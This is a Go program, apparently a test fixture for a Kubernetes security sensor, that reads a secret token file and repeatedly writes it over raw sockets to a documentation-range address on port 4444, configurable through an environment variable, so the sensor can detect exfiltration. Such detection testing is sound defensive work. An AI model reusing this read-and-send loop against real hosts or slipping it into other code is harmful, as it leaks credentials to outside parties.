// Command k8s-exfil-demo reads a sensitive secret, then connect()+write()s it.
// Used by deploy/k8s/demo so the sensor can seed taint on openat and prove EXFIL.
package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func main() {
	delay := 12 * time.Second
	if v := os.Getenv("DELAY_SEC"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n >= 0 {
			delay = time.Duration(n) * time.Second
		}
	}
	target := "203.0.113.66:4444"
	if v := os.Getenv("EXFIL_TARGET"); v != "" {
		target = v
	}
	secretPath := "/secrets/demo-token"
	if v := os.Getenv("DEMO_SECRET_PATH"); v != "" {
		secretPath = v
	}

	fmt.Printf("k8s-exfil-demo: pid=%d sleeping %s for sensor attribution\n", os.Getpid(), delay)
	time.Sleep(delay)

	raw, err := os.ReadFile(secretPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "k8s-exfil-demo: read %s: %v\n", secretPath, err)
		os.Exit(1)
	}
	secret := strings.TrimSpace(string(raw))
	fmt.Printf("k8s-exfil-demo: read %d bytes from %s; pausing for taint seed\n", len(secret), secretPath)
	time.Sleep(2 * time.Second)

	host, portStr, err := net.SplitHostPort(target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "k8s-exfil-demo: bad EXFIL_TARGET %q: %v\n", target, err)
		os.Exit(1)
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "k8s-exfil-demo: bad port: %v\n", err)
		os.Exit(1)
	}
	ip := net.ParseIP(host).To4()
	if ip == nil {
		fmt.Fprintf(os.Stderr, "k8s-exfil-demo: need IPv4 target, got %q\n", host)
		os.Exit(1)
	}

	for i := 1; ; i++ {
		fmt.Printf("k8s-exfil-demo: attempt %d connect+write %s (%d byte secret)\n", i, target, len(secret))
		if err := connectAndWrite(ip, port, []byte(secret)); err != nil {
			fmt.Printf("k8s-exfil-demo: %v\n", err)
		}
		time.Sleep(2 * time.Second)
	}
}

// connectAndWrite issues connect() then write() on the same FD so the sensor
// can correlate payload even when the peer never accepts (TEST-NET blackhole).
func connectAndWrite(ip net.IP, port int, payload []byte) error {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	if err != nil {
		return fmt.Errorf("socket: %w", err)
	}
	defer syscall.Close(fd)

	_ = syscall.SetNonblock(fd, true)
	sa := &syscall.SockaddrInet4{Port: port}
	copy(sa.Addr[:], ip.To4())
	if err := syscall.Connect(fd, sa); err != nil && err != syscall.EINPROGRESS && err != syscall.EALREADY {
		// Still attempt write — some kernels report other interim errors.
		fmt.Printf("k8s-exfil-demo: connect: %v (continuing to write)\n", err)
	}
	// Brief yield so connect is visible before write correlation window.
	time.Sleep(20 * time.Millisecond)
	n, err := syscall.Write(fd, payload)
	fmt.Printf("k8s-exfil-demo: write n=%d err=%v\n", n, err)
	return nil
}
